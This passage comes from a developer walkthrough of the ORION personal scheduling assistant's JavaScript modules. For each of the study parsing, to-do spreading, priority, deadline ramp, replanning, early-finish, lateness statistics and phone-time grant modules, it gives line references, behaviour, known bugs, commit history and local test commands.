- **What it is.** Parser for study-session requests: how many minutes, which subject, by what date, and how to split it into sessions. It is the front half of `orion-plan-study` and `orion-study`; `fit-study.mjs` is the back half.
- **Where.** `scripts/lib/life/study-request.mjs` (233 lines). Export: `parseStudyRequest(text, today)` `:22-58`. Internals: `SUBJECT_ALIASES` `:3-13`; `parseMinutes` `:64-82`; `parseSubject` `:88-103`; `normalizeSubject` `:109-117`; `parseSessions` `:124-133`; `parseByDate` `:135-170`; `nextWeekday` `:189-203`; `splitSessions` `:220-233`.
- **How it works.**
  1. **Explicit sessions win** (added 2026-09-29): a regex finds "two one-hour sessions", "3 x 45 min", "two 1 hour study sessions" (count one..four or 1-4; unit hour/minute; word session/block/slot). Total = count x each; 15..600 minutes else `{error: "minutes out of range"}`; `splitMinutes` is `Array(count).fill(each)` (`:27-33`).
  2. Otherwise `parseMinutes`: "an hour" 60, "half an hour" 30, `N hours|hrs|h` x 60, `N min` (decimals ok). Default **60** if nothing is said. Range 15..600 or error.
  3. Subject: text after `for ` (preferred) or `on ` up to before/by/this/next/today/tomorrow/outside/during/after or punctuation; aliases map to course codes: macro/macroeconomics/econ -> ECON1115, marketing/mktg -> MKTG2201, discrete/cs1800 -> CS1800, programming/cs2100 -> CS2100; unknown subjects keep the original case (`:3-13`, `:109-117`).
  4. `byDate`: an ISO date; today; tomorrow; "this week"/"by the weekend" -> the coming **Sunday**; "next week" -> Sunday after; a weekday name -> the next one strictly after today; default **today** (`:135-170`).
  5. No explicit sessions: `splitSessions(minutes)`: <= 120 is one session; more is chunks of 90 with the remainder (`:220-233`).
- **Contracts.** `parseStudyRequest(text, today: "YYYY-MM-DD")` -> `{minutes, subject: string|null, byDate, splitMinutes: number[]}` or `{error}`.
- **Calls out to.** Nothing. Callers: `scripts/orion-plan-study:16` (then loops days and calls `fitStudy` per day), `scripts/orion-study:19` (day file only).
- **History.** `5bc82b0` 2026-09-29 `agent(life-study-parse)`; `383d1e0` 2026-09-29 "preserve original casing for unknown subjects" (a Qwen self-fix round); `37c29fd` 2026-09-30 integration (session-count rule, this-week/weekend dates).
- **Gotchas & lessons.**
  - The subject alias table is **hard-coded to Nick's courses this term** (course codes for ECON, MKTG, CS1800, CS2100). A new course is just kept as typed.
  - "of marketing" gives no subject: only `for`/`on` are recognised (`"3 hours of marketing by friday"` -> `subject: null`; I ran it).
  - Anything under 15 minutes returns an error (`"study 10 minutes"` -> error), which `orion-plan-study` prints as `orion-plan-study: minutes out of range`.
  - "this week" means through Sunday, so on a Sunday it means today only.
  - Unused `import assert` at `:1`; `parseSessions`' JSDoc says it returns `string|null` but returns an object or null.
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {parseStudyRequest as p} from "./scripts/lib/life/study-request.mjs"; console.log(p("two one-hour study sessions for macro this week","2026-10-14"))'` (expect minutes 120, ECON1115, byDate 2026-10-18, `[60,60]`).
  2. Open `scripts/orion-plan-study:22-47` and see how `splitMinutes` is placed one per day first, then up to 3 per day.
  3. `node --test tests/life-study-request.test.mjs`.
- **Questions to ask your tutor.**
  1. Why does an explicit session count override the minutes parser?
  2. Why chunks of 90 above 120 minutes?
  3. What would break if "this week" meant "next 7 days" instead of "through Sunday"?
  4. How should the alias table be fed so it does not need code edits each term?

#### 2.9.5 `task-spread.mjs`: spreading a to-do across days

- **What it is.** Pure functions that turn a to-do's notes ("2 hours a day until it's due", "two 2-hour blocks, Tuesday and Thursday", "four 1-hour blocks this week", "5 hours total") plus its due date into a list of `{date, minutes}` sessions, rank it (`taskImportance`), and detect "only schedule this once X is done" (`waitsFor`). Nick's insight (header, `:3-6`): to-dos do not need scheduling one by one; each has a due date and a description of how to spread it, and ORION plans from that, the due date and the priority.
- **Where.** `scripts/lib/life/task-spread.mjs` (130 lines): `minutesIn` `:14-20`; `parseSpread` `:35-65`; `planSessions` `:76-103`; `taskImportance` `:109-114`; `waitsFor` `:123-130`.
- **How it works.**
  1. `minutesIn(text)`: "2 hours", "90 min", "1.5h", "an hour and a half", "2-hour" -> minutes or null (`:14-20`).
  2. `parseSpread(text)` tries, in order (`:35-65`): **daily** (`a/per/each/every day`, `daily`) -> `{kind:"daily", minutes}`; **per-day lengths** ("2 hours on tuesday, 2 hours on thursday") -> `{kind:"sessions", sessions:[{minutes, weekday}]}`; **count x length** ("two 2-hour blocks", "3x 45 min", with optional weekday names matched in order) -> sessions; **total** (the words total / in all / overall / about / roughly) -> `{kind:"total", minutes}`; else `null`. `thisWeek` is set by "this week".
  3. `planSessions(spread, {today, due, sessionCap = 120})` (`:76-103`): the last working day is the day **before** the due date (`due` is included only when `due == today`); no due date means a 7-day horizon. `daily` puts the minutes on every day; `sessions` puts weekday-tagged sessions on the next such weekday (if on/before the due date) and spreads untagged ones evenly over the remaining room; `total` splits into pieces of at most 120 minutes (rounded up to 5) spread evenly. Several sessions on one date are merged into one block.
  4. `taskImportance({priority, due}, today)` (`:109-114`): **0 must** if priority is high or the due date is today/tomorrow; **2 optional** if priority is low; else **1**.
  5. `waitsFor(notes, openTitles)` (`:123-130`): requires both a condition word (once/unless/until/after/only/when/before) and a completion word (complete/done/finish/over) in the notes, then finds which **open** to-do title is named either in quotes or as a >= 6 character substring of the normalised notes. Returns that title or null.
- **Contracts.** Inputs/outputs above. Weekdays are JS `getDay()` numbers (0 = Sunday). `planSessions` throws `TypeError("today must be YYYY-MM-DD")`.
- **Calls out to.** Nothing. Callers: `orion-tasks` (`parseSpread` `:84`, `planSessions` `:138`, `taskImportance` `:139`, `waitsFor` `:130,177,236`), `orion-reschedule` (`:568,570` to skip spread/waiting to-dos in `day --todos`), `orion-morning:114` and `orion-proactive:70` (`waitsFor` to say "waiting").
- **History.** `e11dc82` 2026-10-06 "to-dos with due dates, spreads and priorities, planned into sessions"; `75ebf7e` 2026-10-06 "to-dos that wait for another; remove exactly what he names" (added `waitsFor`).
- **Gotchas & lessons.**
  - The due date is excluded from the work days: a due-tomorrow to-do gets sessions **today** only. This is deliberate ("The due date itself is included only when nothing else fits before it", doc comment `:72-73`) but the code only includes it when `end == today`.
  - `thisWeek` limits untagged sessions to through Sunday (`weekEnd`), but weekday-tagged ones are only constrained by `due ?? limit`.
  - "four 1-hour blocks this week" with no due date, run on a Wednesday, gave 4 consecutive days (Wed-Sat), one hour each, not spread to Sunday: untagged sessions use `floor(i * room / n)` with `room` = days through Sunday (I ran it: 10-14, 10-15, 10-16, 10-17; `room` is 5 so that matches).
  - `waitsFor` is a keyword heuristic: any note containing "after ... done" plus text that happens to include another to-do's title (>= 6 chars) will be read as a dependency.
  - **Mismatch with `todo-parse`**: `task-spread.minutesIn` is the correct duration reader (handles "for 2 hours"); `todo-parse.parseDuration` is not (see 2.9.3).
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {parseSpread,planSessions} from "./scripts/lib/life/task-spread.mjs"; const s=parseSpread("two 2-hour blocks, Tuesday and Thursday"); console.log(s, planSessions(s,{today:"2026-10-14",due:"2026-10-21"}))'`
  2. `node --test tests/life-task-spread.test.mjs` (10 tests).
  3. Open `scripts/orion-tasks:112-160` (`plan`) to see how `sessions` become `orion-reschedule day --plan "<title>, <minutes>[, must|optional]"` calls.
- **Questions to ask your tutor.**
  1. Why exclude the due date from the working days?
  2. Walk through `planSessions` for `{kind:"total", minutes:300}` due in six days: why 100 x 3?
  3. How does `taskImportance` interact with `replan`'s `importance` field and with `keepFree`?
  4. What false positives can `waitsFor` produce, and how would quoting help?

#### 2.9.6 `priority.mjs`: kinds, importance and rank words

- **What it is.** Three independent notions of "how much does this block matter", used by different callers: (1) `priorityOf` = a fixed kind ordering used when sorting for shrink/displacement, (2) `importanceOf` = 0 must / 1 normal / 2 optional, from an explicit field or words in the title, used by `replan` to decide what is left out, (3) `rankOf` = a word ("fixed", "high", "medium", "low") that ORION can say and reason with in answers (`orion-remote:567-570`).
- **Where.** `scripts/lib/life/priority.mjs` (87 lines): `KINDS` `:1-11`; `priorityOf` `:14-20`; `importanceOf` `:23-29`; `comparePriority` `:38-58`; `movable` `:61-66`; `rankOf` `:74-87`.
- **How it works.**
  - Kind order (index = priority, lower = more important): `class, sleep, gym, deadline, study, side_project, meal, other, rest`; unknown kind -> 9. A title containing nap / wind down / sleep / bed is forced to the `sleep` slot (`:17`), "Sleep is his second priority after classes" (a nap used to be `rest` and got dropped first, 2026-10-01).
  - `importanceOf(block)`: `block.importance` if it is 0, 1 or 2; else title words ("must", "have to", "need to", "high priority", "important", "cannot drop") -> 0; ("if there's time", "possible", "maybe", "optional", "low priority", "nice to have") -> 2; else 1.
  - `comparePriority(a, b)`: non-movable first; then importance ascending; then kind priority ascending; then `start`; then `id` (a total order, so sorting is deterministic).
  - `movable(block)`: false if `fixed`, `kind === "class"` or `kind === "sleep"`.
  - `rankOf(block, {ranks})`: a real class (`class` + fixed + not ORION) is `"fixed"`; then his own words in `config.ranks` (substring of the title); then any other `fixed` block is `"fixed"`; then importance 0 -> high, 2 -> low; a sleepy title -> high; kinds gym/deadline/study -> high; side_project/meal/other -> medium; else (rest) low.
- **Contracts.** Blocks as in 2.2. `rankOf` returns one of `"fixed" | "high" | "medium" | "low"` or whatever string Nick stored in `ranks` (only `high|medium|low` are accepted by `setRank`).
- **Calls out to.** Nothing. Used by `replan` (importanceOf, priorityOf), `lengths` (priorityOf), `fit-study` (priorityOf), `next-action` (comparePriority), `orion-remote:567` (rankOf). `config.ranks` itself is also copied into ORION's brain as `rank: <word>: <rank> priority (his words)` by `scripts/orion-brain-seed:111`.
- **History.** `a9e5e43` 2026-09-29 `agent(life-priority): Priority ranking`; `afe697b` 2026-09-30 "rebuild tangled days by priority" (added `importanceOf`); `2602593` 2026-10-01 day rules; `295000a` 2026-10-05 "one class-wrapper rule for code and ORION; every item carries a rank" (added `rankOf`).
- **Gotchas & lessons.**
  - Two copies of the kind list exist: `block.mjs:1-11` and `priority.mjs:1-11`; keep them in step by hand.
  - `importanceOf` is the one that matters for dropping; `priorityOf` is only a tie-break inside `replan`'s sort (`replan.mjs:133-134`).
  - `rankOf` is **description, not enforcement** for `ranks`: `replan` does not read `config.ranks` at all in this snapshot. The rank words appear only in what `orion-remote` prints (`[high, movable]`) so the model can reason in words; a "gym is high" rank does not change `replan`'s ordering by itself **(inferred by grep: no `rankOf` or `ranks` use in `replan.mjs`)**.
  - Matching is substring, case-insensitive, first matching word wins (object order).
- **Walk it yourself.**
  1. `node --test tests/life-priority.test.mjs tests/life-rank.test.mjs`.
  2. `grep -rn "rankOf\|importanceOf" scripts | grep -v "^scripts/lib/life/priority"` to see all call sites.
  3. Open `scripts/orion-remote:560-575` to see where rank words are shown.
- **Questions to ask your tutor.**
  1. Why separate importance (what to drop) from priority (kind order) from rank (what to say)?
  2. Why is "sleep" second after "class"?
  3. What would it take to make `config.ranks` actually influence `replan`?
  4. Why does `comparePriority` end in an `id` comparison?

#### 2.9.7 `deadline-ramp.mjs`: how much study each day before an exam

- **What it is.** Given deadlines (quizzes, exams, essays...), it returns, per day, how many study minutes each deserves today, rising as the deadline nears. `fill-day` turns today's entry into "Study for MKTG2201 quiz, 45 min" asks. Header: "Qwen's run stalled on the capping spill (minutes lost when the first day overflowed); finished by Claude, 2026-09-30" (`:1-3`).
- **Where.** `scripts/lib/life/deadline-ramp.mjs` (98 lines): `NEEDS` `:4`; `WINDOW` `:5`; `deadlineKind` `:14-18`; `spread` `:26-31`; `spreadAll` `:33-42`; `ramp` `:44-98`.
- **How it works.**
  1. Total need by kind (minutes): exam 600, quiz 240, presentation 300, essay 480, assignment 300, other 120. Window of study days before the due date: exam 10, quiz 5, presentation 6, essay 8, assignment 6, other 3 (`:4-5`). Kind is found by word (exam/final/midterm; quiz/test; presentation/panopto/slides; essay/report; assignment/coursework/submission/due) (`:6-10`); first match wins.
  2. For each deadline `away` days from today (skip if `away <= 0` or `> horizonDays + 10`), `remaining = max(0, NEEDS[kind] - done[id])`, and study days = the last `min(WINDOW, away)` days ending the day before it (`:50-57`).
  3. `spread(remaining, days)` distributes with **linear weights 1..n** (later days get more), each rounded to 15 minutes with a 30-minute floor, and the last day absorbs the rounding difference (`:33-42`). If days x 30 > target, drop the earliest days and retry ("fewer, later days rather than 30-minute minimums that overshoot", `:27-30`).
  4. **Cap per day** (`maxPerDay = 180`, tolerated up to +15): the busiest later days first, scale items down, and the cut goes to the nearest earlier day with room; if nowhere has room, the minutes stay on that day, "rather than vanish" (`:66-89`).
  5. Return only dates within `[today, today + horizonDays - 1]` (default 14), items merged per deadline id: `[{date, items:[{id,title,minutes,reason}], total}]`. `reason` reads `"quiz on Tuesday 20 October — 240 min left"`.
- **Contracts.** `ramp(deadlines: [{id, title, date: "YYYY-MM-DD"}], {today, done = {id: minutesDone}, horizonDays = 14, maxPerDay = 180})`. Throws `TypeError` on a bad `today` or non-array. `done` is **never supplied by any caller** in this snapshot (`orion-reschedule:206-207` passes only `today`), so completed study never reduces the need.
- **Calls out to.** Nothing. Caller: `studyPlanFor` in `orion-reschedule:204-211`, filtered to assessment-looking titles (public holidays are in the same deadline feed).
- **History.** `37c29fd` 2026-09-30 only (the "daily life loop" commit). Test: `tests/tighten-deadline-ramp.test.mjs` (8).
- **Gotchas & lessons.**
  - `done` is plumbed but unused, so the ramp repeats the same schedule each morning; booked study blocks are credited in `fill-day` (`booked = minutesOf("study")`) instead, not through `done`.
  - A deadline whose title contains "due" is an `assignment`; "DUE 23:59 — ..." titles are stripped of the prefix by the caller (`replace(/^DUE \d\d:\d\d — /, "")`).
  - Four of the six kind-words are generic (`test`, `due`, `final`, `report`), so "Final project demo" is an exam (600 minutes).
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {ramp} from "./scripts/lib/life/deadline-ramp.mjs"; console.log(JSON.stringify(ramp([{id:"q",title:"MKTG2201 quiz",date:"2026-10-20"}],{today:"2026-10-14"}),null,1))'`
  2. Add a second deadline on the same date and watch the cap logic.
  3. Open `scripts/lib/life/fill-day.mjs:18-24` to see how today's share becomes asks.
- **Questions to ask your tutor.**
  1. Why linear weights 1..n rather than exponential or equal days?
  2. Explain the capping spill and why minutes move to *earlier* days.
  3. Why is the study need by kind a table rather than learned from his history?
  4. What would a correct use of `done` look like, and where would it come from?

#### 2.9.8 `replan.mjs`: the placement engine

- **What it is.** The one function that decides where everything goes. Given the day's blocks, the current minute, the waking window and a list of things to add, it returns the new layout, what moved, what was created, what did not fit, and what had to be shifted from the time Nick asked for. Every `orion-reschedule` command that changes a day ends in a call to it. The header (`:1-16`) records the rewrite of 2026-09-30, "after a day where soccer 5-7 went onto a full calendar and every attempt overlapped, refused, or put gym at 1 PM before soccer".
- **Where.** `scripts/lib/life/replan.mjs` (161 lines): `overlaps` `:20`; `slot` `:24-29`; `layout` `:34-47`; `replan` `:59-161`.
- **The three kinds of time** (header `:6-16`):
  - **walls**: classes, plans with people, anything `fixed`; also `blocked` busy periods and `add` items with `fixed` and an integer `at`. Never move.
  - **pinned**: an `add` item with an integer `at` that is not fixed ("nap at 1"). Placed exactly there; ORION's own blocks get out of its way. Only a wall (or an earlier pinned item) can push one, and then only to just past that wall, reported in `shifted`.
  - **flexible**: everything else, laid out in **time order**, each at or after where it wanted to be. Importance only decides what is left out when not everything fits; it never reorders the day.
- **How it works (step by step).**
  1. `floor = max(window.start, now)`; `end = window.end`. Walls = fixed blocks + `blocked` + new fixed items (`:63-68`).
  2. Split movable blocks into **finished** (`end <= floor`, stay as history), **running now** (started before `floor`, ends after) and the rest. A running block stays only if its remaining time `[floor, end]` is clear of walls and of other past/staying blocks; otherwise it is `interrupted` and re-placed like a displaced block (`:71-82`). This came from property tests on 2026-10-01 ("blocks that were never compared with each other kept overlapping").
  3. **Pinned pass** (`:84-102`): pinned asks in the order of their times; if the wanted slot is not in the past, overlaps nothing in `taken` and fits before `end`, the block is created exactly there; else it goes to `lostTime` with `because` = the blocker's title or `"it was already past"`.
  4. **Stay-put pass** (`:107-115`): unless `rebuild`, every movable block starting at/after `floor` is kept if it does not come within `buffer` of anything already kept (greedy in time order). With `rebuild: true` nothing stays; all remaining movable work is laid out again.
  5. `softWalls` (ORION's own guesses, e.g. travel to class) are added for flexible work only, and dropped for any pinned block that overlaps them (`:116-117`).
  6. **Flexible list** (`:121-130`): displaced/interrupted blocks (`after = max(floor, own start, 18:30 if the title says dinner)`, `fresh: false`, `pref: true`, seq negative so they come first), then `lostTime` items (`fresh: true`), then new untimed adds (`after` = max(floor, `a.after`), `before`, optional `prefer` = natural time; `pref` true if any of after/before/prefer given).
  7. **Choose what fits** (`:131-148`): sort by `importanceOf` ascending (must first), then existing before new (`fresh`), then `priorityOf`, then `after`. For each item, trial-lay out `chosen + item` with `layout`; keep it if nothing is missed **and** the free-time rule holds; else it goes to `unplaced`. The free-time rule `roomy`: `!keepFree || !item.fresh || importance === 0 || freeAfter(...) >= keepFree`. So `keepFree` limits only what is ADDED and never an existing plan or a must-have.
  8. **Final layout** of the chosen set (`:149`), then results.
- **The two helpers:**

```js
// scripts/lib/life/replan.mjs:24-29
function slot(taken, { from, before, minutes, floor, end, buffer = 0 }) {
  const padded = buffer ? taken.map((t) => ({ ...t, start: t.start - buffer, end: t.end + buffer })) : taken;
  const gaps = freeGaps(padded, { start: floor, end }, { minimum: 5 });
  const gap = gaps.find((g) => Math.max(g.start, from) + minutes <= Math.min(g.end, before));
  return gap ? Math.max(gap.start, from) : null;
}
```
  `layout` (`:34-47`) sorts items by `pref` first, then desired start, then `seq`; places each at `slot(... from: want)`, and if that natural time is full retries from its hard floor `item.after`.
- **Contracts.**
  - Input `blocks`: blocks (2.2). `changes` = `{ now: minute, window: {start,end}, blocked: [{start,end,title?}], soft: [{start,end,title?}], add: [{title, kind?, minutes, at?, fixed?, after?, before?, prefer?, importance?}], rebuild = false, buffer = 0, keepFree = 0 }`.
  - Output: `{ blocks (all blocks sorted by start, excluding the synthetic `blocked-*` walls), moves: [{id,title,from,to}], created: [block] (new fixed + pinned + placed new), unplaced: [{title, minutes, id, importance, fresh}], shifted: [{title, from, to, because}] }`.
  - New block ids: `new-<i>`, `new-fixed-<i>`; synthetic walls `blocked-<i>`, `blocked-soft-<k>`.
- **Calls out to.** `gaps.freeGaps`, `priority.importanceOf/priorityOf`. Called from `orion-reschedule` at `:274,277,286` (shape/cascade for extend/resize/move), `:399` (`now`), `:913,926,934` (main), `:953` (fill pass).
- **History.** `37c29fd` 2026-09-30 created; `afe697b` 2026-09-30 "rebuild tangled days by priority"; `752ac71` 2026-09-30 "keep his times and order; sensible times" (the three-kinds rewrite); `2602593` 2026-10-01 "day rules by construction: no overlaps, a cascade, true-size drawing" (buffer, `keepFree`, running-now handling); `0a0aa7e` 2026-10-02 "preserve explicit times and apply complete calendar edits" (explicit `at` kept exactly).
- **Gotchas & lessons.**
  - **A displaced existing block that does not fit is reported in `unplaced` with `fresh: false`, and `orion-reschedule` then REMOVES it from the calendar** (`orion-reschedule:942`, `removed = [...removed, ...result.unplaced.map(...)]`). It is announced as `NOT BOOKED`/`SKIPPED OPTIONAL`, but it is a delete, undoable with `undo`.
  - A must-have (`importance 0`) that cannot be placed aborts the whole command (`orion-reschedule:976-978`, "NOTHING WAS CHANGED: must-haves could not fit").
  - `keepFree` and `buffer` come from config (`freeMinutesKept` 60, `bufferMinutes` 5 in the live file).
  - `moves` only lists blocks whose `start` changed; an unchanged start with a changed length is not a move (length changes are done by `lengthMoves` in the CLI, which adds `toEnd`).
  - `layout` is re-run per item (quadratic-ish) but days have < 30 blocks.
  - Time is plain minutes: nothing here understands midnight crossing; the window end is capped at 1440 by the caller, so a night plan past 24:00 cannot be laid out.
- **Walk it yourself.**
  1. `node --test tests/life-replan.test.mjs tests/life-day-scenarios.test.mjs tests/life-day-invariants.test.mjs` (11 + 10 + 3 tests).
  2. Reproduce the worked example in 2.8 and change `buffer` to 0 to see the study snap to 14:00 with no buffer.
  3. Read `scripts/orion-reschedule:913-940` right after `replan` to see rebuild/shrink retry.
- **Questions to ask your tutor.**
  1. Why lay flexible items out in time order and use importance only to choose the set?
  2. What is "pinned" vs "fixed" vs "soft wall" and who creates each?
  3. Why does `slot` pad every `taken` block by `buffer` rather than the candidate?
  4. Walk through the case where Nick pins a nap at 13:00 on top of an existing Study 13:00-14:00.
  5. What does `lostTime` do and how does it reach the human-readable `SHIFTED:` line?
  6. What are the failure modes of removing a displaced block that cannot fit?

#### 2.9.9 `early.mjs`: "I finished early" and "I'm out of class early"

- **What it is.** Pulls the rest of the day forward when Nick finishes something early or leaves class early. It never moves anything later. Two modes: `"block"` (shorten the movable block under way to now) and `"out-of-class"` (clip a real class that just ended and pull the afternoon forward). It is behind the phone's "I'm out early" button and `orion-reschedule early` (see `plugin/workspace/SCHEDULING.md:56`).
- **Where.** `scripts/lib/life/early.mjs` (218 lines): `earlyContext` `:20-41`; `buildWalls` `:51-66`; `finishEarly` `:78-218`.
- **How it works.**
  1. `earlyContext(blocks, {now, commuteMinutes = 45})` answers "what just happened?": a **real class under way** (`start < now < end`) -> `{kind:"after-class", classId, classTitle, classEnd}`; else a movable (`fixed === false`) block with `start <= now < end` -> `{kind:"block", id, title}`; else `{kind:"none"}`. Only the class currently under way counts (so a past class cannot steal the button from a later task or lengthen the commute on a second tap).
  2. `finishEarly(blocks, {now, mode, commuteMinutes = 45, buffer = 5, dayEnd = 1440})`:
     - mode `"block"`: find the movable block under way (else throw `"nothing is under way to finish"`); `freeFrom = now`; `shortened = {id, title, from: block.end, to: now}`; scan cursor starts at `now + buffer`.
     - mode `"out-of-class"`: needs `earlyContext` to say after-class (else throw `"no class just ended"`); if another real class is ahead (`start >= now`) he stays on campus and `freeFrom = now`, else `freeFrom = now + commuteMinutes` (the trip home); the class is **clipped** (`clipped = {id, title, end: now}`) if it still had time left.
  3. **Walls** = every fixed block + every block whose title says nap/wind down/sleep/bed + `commuteWalls(effectiveBlocks, {commuteMinutes})` (the return journey stays a wall after the clipped last class) (`:51-66`).
  4. **Candidates** = movable, non-sleep blocks starting at or after `now` (excluding the shortened one), sorted by start.
  5. **Pull forward greedily** (`:152-208`): for each candidate scan minute by minute from the cursor up to the block's own start for the earliest `s` such that `[s - buffer, s + len + buffer)` overlaps no wall and no already-placed candidate and fits before `dayEnd`; if `s < block.start` record a move and set `cursor = s + len + buffer`; else the block is `unchanged` and the cursor jumps past it.
- **Contracts.** Returns `{ mode, freeFrom, shortened: {id,title,from,to}|null, clipped: {id,title,end}|null, moves: [{id,title,from,to}], unchanged: [id] }`. Throws `TypeError` for non-array blocks, non-integer `now` outside 0..1439, or a bad mode.
- **Calls out to.** `commute.commuteWalls`. Callers: `orion-reschedule:638,652` (`earlyContext`, deciding the mode and the `--check` output), `:672` (`finishEarly`), then `freed-time` (`breakFor`, `shortBlock`, `extendWithin`) to use the freed minutes (`:668-708`).
- **History.** `b4f6ae4` 2026-10-01 `agent-repair(early): reviewer intervention` (the review system fixed an agent-written module); `ae41446` 2026-10-02 "unify early exit and scheduling rules" (diff read: `earlyContext` used to accept a class up to `end + commute + 30` minutes after it ended, now only a class currently under way, so a past class cannot steal the button or lengthen the commute on a second tap; default `commuteMinutes` 30 -> 45; the special case that excluded the commute-home wall after the clipped class was removed so the return trip stays a wall); freed-time layering `1e99edc` 2026-10-06.
- **Gotchas & lessons.**
  - Block mode only targets `fixed === false` strictly. A **pinned** ORION block (`fixed: true, pinned: true` after `pinBlocks`) is not eligible: "nothing is under way to finish" even though ORION booked it **(inferred from the strict comparison and `pins.pinBlocks`; I did not run the CLI)**.
  - `early` has its own defaults `commuteMinutes = 45` and `buffer = 5`; the CLI passes config values (`orion-reschedule:672`), but `earlyContext` called without options uses 45.
  - `commuteWalls` is called without `homeGapMinutes`, so the module default (150) applies, not the live config.
  - The scan is O(day minutes x walls) per block, fine for one day.
  - Worked numbers (2.8 step 8): Study 13:00-14:00 under way, now 13:30: shortened to 13:30, Gym 15:00 -> 13:35.
- **Walk it yourself.**
  1. `node --test tests/surfaces-early.test.mjs` (10 tests).
  2. Open `scripts/orion-reschedule:623-730` to see `--check`, `--dry-run`, and the chain into `freed-time`.
  3. Run the example in 2.8 step 8 with `mode: "out-of-class"` on a day with a class ending at 13:30 and see `freeFrom` change with a later class present.
- **Questions to ask your tutor.**
  1. Why is "never move later" a hard rule here?
  2. Why does a later class on the day change `freeFrom` (campus vs home)?
  3. Why are sleep-titled blocks walls and not candidates?
  4. How do `earlyContext` and `finishEarly` guard against a second tap?

#### 2.9.10 `lateness.mjs`: how late he starts things

- **What it is.** Statistics on planned vs actual start from the check-in history: overall and by kind, weekday and time-of-day band, plus a trend and one plain sentence ("You usually start about 25 min late, worst with study (about 40 min) — slipping lately."). Output of `orion-patterns`, built to be read by the model and by Nick.
- **Where.** `scripts/lib/life/lateness.mjs` (211 lines): `delayOf` `:5-14`; `median` `:20-29`; `onTimeRate` `:35-39`; `computeStat` `:47-58`; `getBand` `:63-68`; `lateness` `:73-161`; `buildSentence` `:166-211`.
- **How it works.**
  1. Valid records have `plannedStart` and `kind`. `delay = actualStart - plannedStart` wrapped into -720..720 (so planned 23:50, actual 00:10 is +20); `actualStart == null` means skipped/never started.
  2. Each group yields `{samples, started, skipped, medianDelay (integer), onTimeRate (share with delay <= 5, 2 decimals), confident: samples >= minSamples (default 3)}`.
  3. Bands by planned start: morning 300-719, afternoon 720-1019, evening 1020-1319, else night.
  4. Trend needs >= 2 x `minSamples` started records, sorted by `at`; compares medians of two groups and says `worse` (>= +10), `better` (<= -10) or `steady`.
  5. Sentence: if overall not confident: `"Only N check-in(s) so far — I'll know your pattern after 3."`; else lead ("start on time" if |median| <= 5; "about X min early" if <= -10; "about X min late"), plus `", worst with <kind> (about Y min)"` for the confident kind whose median is >= overall + 15, plus a trend suffix.
- **Contracts.** `lateness(records: [{plannedStart, actualStart|null, kind, weekday, at: ISO}], {minSamples = 3})` -> `{overall, byKind, byWeekday, byBand, trend: "better"|"worse"|"steady"|null, sentence}`. Throws `TypeError` if not an array. Records are the lines of `life-history.jsonl`.
- **Calls out to.** Nothing. Only caller: `scripts/orion-patterns:7,34` (`lateness(outcomes)`, prints `late.sentence` and a per-kind line).
- **History.** `37c29fd` 2026-09-30 only (Qwen's `tighten-orion/lateness` finished by Claude). Test: `tests/tighten-lateness.test.mjs`, written with assertions directly inside `describe` callbacks rather than `it` blocks, so it reports as one suite per block and fails at load time on a bad assertion.
- **Gotchas & lessons.**
  - **The trend compares the oldest records, not the newest.** The comment says "most recent minSamples vs previous minSamples" (`:141`) but the code slices the *ascending* list: `older = sorted.slice(0, minSamples)`, `newer = sorted.slice(minSamples, 2*minSamples)` (`:147-148`). Once there are more than 6 started records, the trend never reflects the latest ones. This is a code-vs-comment mismatch; trust the code.
  - `at.localeCompare` throws if a started record has no `at` (history lines always have one).
  - `medianDelay` is rounded to an integer; `lateHabit` in `history.mjs` uses a different, separate rule (>= 3 happened samples and >= 15 min median).
  - Two overlapping "patterns" systems exist: `patterns.mjs` (written to `patterns.json`, read by the planner/check-ins) and `lateness.mjs` (report only). They compute medians differently (`patterns.median` returns null below 3 samples).
- **Walk it yourself.**
  1. `node --input-type=module -e 'import {lateness} from "./scripts/lib/life/lateness.mjs"; console.log(lateness([{plannedStart:540,actualStart:560,kind:"study",weekday:1,at:"2026-10-01"},{plannedStart:600,actualStart:625,kind:"study",weekday:2,at:"2026-10-02"},{plannedStart:660,actualStart:690,kind:"gym",weekday:3,at:"2026-10-03"}]).sentence)'`
  2. `wc -l ~/.openclaw/orion-controlled/life-history.jsonl` to see how much real data exists.
  3. Read `scripts/orion-patterns:34-43`.
- **Questions to ask your tutor.**
  1. Why is the median used rather than the mean?
  2. Why wrap the delay into -720..720?
  3. Explain the trend bug and write a one-line fix.
  4. Why does confidence depend on `samples` (including skips) rather than `started`?

#### 2.9.11 `grant-policy.mjs`: how much extra phone time to grant

- **What it is.** The decision rule for "can I have 20 more minutes on my phone?" while a lock is on (a night lock or a work/check-in lock). It returns minutes and a short sentence in ORION's voice. **Not wired to any executable at HEAD** (tests only).
- **Where.** `scripts/lib/life/grant-policy.mjs` (125 lines, tab-indented): `minuteToClock` `:4-10`; `isEmptyReason` `:15-19`; `decideGrant` `:27-125`.
- **How it works** (`decideGrant`):
  1. Validate `asked` is an integer 1..600 and `now.minute` 0..1439 (`TypeError` otherwise) (`:29-34`).
  2. `isNight = lock.why === "night" || now.minute < 360`; `isWork = lock.why === "work" || lock.why === "checkin"` (`:36-37`).
  3. **Twice tonight**: `grantsTonight >= 2` -> grant 0 with `"That's twice already tonight. Phone down — bed."` (night) or `"That's twice already — back to it."` (`:43-49`).
  4. **Night lock** (`:52-92`): empty reason (blank, "please", "pretty please", "pls") -> 0 and `"No reason, no time — it's past bedtime. Tell me what it's for and I can give you 10."`; else `grant = min(asked, 20)`; if a first commitment tomorrow is known and the sleep left after the grant is under `sleepHours*60 - 60` (default 420 min) the grant is cut to 10; then capped to the minutes until `lock.untilMinute` (handling wrap past midnight), to 60, and floored at 0; message `"Unlocked for N min — H:MM AM/PM. Then it locks again."`.
  5. **Work lock** (`:94-117`): a reason -> `min(asked, 15)`; none -> 0 with `"You planned this block. Finish it or tell me why you need the phone."`; same caps.
  6. If `asked > grant > 0` append `" (asked for A; G is what I'll do.)"` (`:120-122`).
- **Contracts.** `decideGrant({now: {date, minute}, asked, reason: string|null, lock: {why, untilMinute}, firstCommitment: minute|null, grantsTonight, sleepHours = 8})` -> `{grant: number, say: string}`. All strings are fixed English templates (no model involved).
- **Calls out to.** Nothing.
- **History.** `e12f128` 2026-10-01 `agent(grant-policy): Extra phone time policy` (Qwen); `b9fc452` 2026-10-01 `agent(final-fix2-1)`: remove an unused `node:assert` import.
- **Gotchas & lessons.**
